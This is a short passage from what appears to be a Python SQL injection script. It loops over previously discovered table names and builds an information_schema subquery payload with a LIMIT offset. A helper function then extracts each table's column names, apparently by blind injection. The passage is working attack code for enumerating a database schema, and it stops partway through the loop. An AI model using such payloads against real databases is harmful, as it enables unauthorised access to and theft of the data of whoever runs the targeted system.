...
print("[-]finding name of columns of each table")
columns=[]
payload_column="(select column_name from information_schema.columns where table_name='{}' limit {},1)"
for table in tables:
    table=str(table)
    p=payload_column.format(table,{})
    column=names(p,6)
